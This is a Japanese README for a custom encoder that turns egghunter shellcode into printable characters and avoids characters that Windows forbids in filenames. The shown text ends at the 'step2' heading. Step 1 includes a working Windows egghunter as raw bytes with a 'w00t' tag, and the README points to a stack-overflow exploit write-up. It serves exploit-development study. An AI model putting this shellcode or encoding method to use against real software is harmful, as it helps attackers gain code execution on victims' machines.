# encoder-shellcode-alpha.py
## About
egghunterなどをalphaのみ(`0x21~0x7f`付近のprint可能な文字)にEncodeするカスタムエンコーダ。   
なお、Windowsでは以下の文字列はファイル名に含めることができないため、これらの文字を使わないようにもした。   
```txt
*  2a
,  2c
/  2f
:  3a
;  3b
<  3c
>  3e
?  3f
\  5c
|  7c
```
この手法の考え方については以下を参照。   
https://www.offensive-security.com/vulndev/quickzip-stack-bof-0day-a-box-of-chocolates/   
## How to use
### step1
以下のようにしてEncodeしたいShellcodeをセットする。   
ここでは`egghunter`変数にセットした。   
```python
import struct

################# User code begin ###################################################################
# You should edit only this section

egghunter = "\x31\xd2\x90\x90\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
egghunter += "w00t" # this is the marker/tag: w00t
egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# Make sure that finally using variable "shellcode"
shellcode = egghunter
################# User code end #####################################################################
```
### step2
